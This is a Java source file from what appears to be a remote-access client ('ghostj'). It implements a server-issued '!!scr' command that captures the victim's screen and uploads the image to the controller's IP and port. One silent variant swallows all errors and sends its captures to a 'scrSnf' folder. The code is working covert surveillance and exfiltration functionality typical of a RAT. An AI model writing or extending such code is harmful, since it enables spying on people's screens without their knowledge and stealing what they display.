package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.util.PrtScreen;
import com.rft.core.client.FileSender;

import java.awt.*;
import java.io.File;
import java.util.Date;

import static com.ghostj.client.conn.HandleConn.writeToServer;
import static com.ghostj.client.conn.HandleConn.writeToServerIgnoreException;

public class FuncPrtScr implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!scr";
	}

	@Override
	public String[] getParamsModel() {
		return new String[]{"[picFile]"};
	}

	@Override
	public String getDescription() {
		return "截图，可选择保存到的文件";
	}

	@Override
	public int getMinParamsAmount() {
		return 0;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {

		String param="scr.png";
		if(params.length>=1) {
			param = params[0]+"MASK";
		}else
			param="scr.MASKpng";
		if (params.length>=8) {//!!scr lc.png sz cl w h x y hint
			try {
				PrtScreen.saveScreen(Double.parseDouble(params[1]),
						Double.parseDouble(params[2]),
						params[0]+"MASK",
						new Dimension(Integer.parseInt(params[3]),Integer.parseInt(params[4])),
						new Point(Integer.parseInt(params[5]),Integer.parseInt(params[6])),
						Integer.parseInt(params[7]));

				FileSender.sendFile(new File(params[0]+"MASK"),
						"scrSnf/"+ ClientMain.name,
						"scrSnf" + new Date().getTime(),
						HandleConn.ip,
						HandleConn.rft_port);
			} catch (Exception ignored) {
			}
			return;
		}
		//rate
		double rate=1;
		if(params.length>=2){
			try{
				rate=Double.parseDouble(params[1]);
			}catch (Exception e){
				throw new IllegalArgumentException("rate只能为浮点数");
			}
		}
		//clrate
		double clrate=1;
		if(params.length>=3){
			try{
				clrate=Double.parseDouble(params[2]);
			}catch (Exception e){
				throw new IllegalArgumentException("clrate只能为浮点数");
			}
		}
		try {
			String finalParam = param;
			double finalRate = rate;
			double finalClrate = clrate;
			Thread t=new Thread(() -> {
				try {
					writeToServer("正在创建屏幕截图\n");
					long ti=PrtScreen.saveScreen(finalRate, finalClrate,finalParam);
					writeToServer("成功将截图保存到 " + finalParam +"\n");
					writeToServer("耗时:"+ti+"ms\n");
				} catch (Exception e) {
					writeToServerIgnoreException("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
				}
				System.out.println(cmd);
				if (params.length>=4&&params[3].equals("nosend"))
					return;
				try {
					//发送到服务器
					FileSender.sendFile(new File(finalParam), "prtscr/"+ ClientMain.name, "prtscr" + new Date().getTime(), HandleConn.ip, HandleConn.rft_port);
					writeToServerIgnoreException("!sendpicurl "+"prtscr/"+ ClientMain.name+"!");
				}catch (Exception e){
					writeToServerIgnoreException("无法将截图上传至服务器"+"\n");
				}
			});
			t.start();
		}catch (Exception e){
			writeToServerIgnoreException("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
		}
		HandleConn.sendFinishToServer();
	}
}
